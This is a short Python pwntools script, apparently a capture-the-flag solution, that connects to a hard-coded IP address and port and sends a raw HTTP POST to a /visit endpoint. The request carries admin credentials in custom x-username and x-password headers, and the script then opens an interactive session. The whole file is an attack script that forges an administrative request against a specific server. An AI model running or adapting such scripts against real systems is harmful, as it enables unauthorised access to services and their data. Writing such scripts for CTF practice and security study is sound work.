from pwn import remote

HOST, PORT = '34.72.72.63', 25562
program = remote(HOST, PORT)

HTTP = f"""POST /visit HTTP/1.1
Host: {HOST}:{PORT}
x-username: admin
x-password: adminpassword
Connection: keep-alive

"""

program.send('')
program.send(HTTP.encode())
program.interactive()